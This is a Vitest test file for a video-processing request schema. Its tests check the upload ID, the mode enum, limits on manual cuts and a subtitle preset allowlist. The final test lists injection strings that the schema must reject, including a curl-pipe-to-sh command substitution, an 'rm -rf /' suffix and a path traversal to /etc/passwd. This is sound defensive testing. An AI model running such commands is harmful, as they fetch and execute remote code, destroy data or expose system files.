import { describe, it, expect } from "vitest";
import { processVideoSchema } from "~/domain/schemas/process-video.schema";
import { MAX_MANUAL_CUTS } from "~/domain/schemas/manual-cut.schema";
import { PROJECT_SUBTITLE_PRESETS } from "~/domain/schemas/projects-actions.schema";

const BASE = { uploadedFileId: "file-123" };

describe("processVideoSchema", () => {
  it("aceita o payload mínimo válido (apenas uploadedFileId)", () => {
    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
    });

    expect(result.success).toBe(true);
  });

  it("aceita o payload completo válido", () => {
    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
      preset: "HORMOZI",
      mode: "manual",
      manualCuts: [{ id: "cut-1", title: "Corte 1", startTime: 10, endTime: 40 }],
    });

    expect(result.success).toBe(true);
  });

  it("rejeita uploadedFileId vazio", () => {
    const result = processVideoSchema.safeParse({ uploadedFileId: "" });
    expect(result.success).toBe(false);
  });

  it("rejeita uploadedFileId ausente", () => {
    const result = processVideoSchema.safeParse({});
    expect(result.success).toBe(false);
  });

  it("rejeita mode fora do enum auto|manual", () => {
    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
      mode: "sabotage",
    });

    expect(result.success).toBe(false);
  });

  it("rejeita manualCuts com endTime <= startTime (payload malicioso)", () => {
    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
      manualCuts: [{ startTime: 40, endTime: 10 }],
    });

    expect(result.success).toBe(false);
  });

  it(`rejeita manualCuts com mais de ${MAX_MANUAL_CUTS} cortes (payload malicioso)`, () => {
    const manualCuts = Array.from({ length: MAX_MANUAL_CUTS + 1 }, (_, i) => ({
      startTime: i * 10,
      endTime: i * 10 + 5,
    }));

    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
      manualCuts,
    });

    expect(result.success).toBe(false);
  });

  it("rejeita preset que não seja string", () => {
    const result = processVideoSchema.safeParse({
      uploadedFileId: "file-123",
      preset: 123 as unknown,
    });

    expect(result.success).toBe(false);
  });

  it.each(PROJECT_SUBTITLE_PRESETS)("aceita o preset %s oferecido pela UI", (preset) => {
    const result = processVideoSchema.safeParse({ ...BASE, preset });
    expect(result.success).toBe(true);
  });

  it.each(["$(curl x.yz|sh)", "`id`", "HORMOZI; rm -rf /", "../../etc/passwd", "hormozi", "UNKNOWN"])(
    "rejeita preset fora da allowlist (payload malicioso: %s)",
    (preset) => {
      const result = processVideoSchema.safeParse({ ...BASE, preset });
      expect(result.success).toBe(false);
    },
  );
});
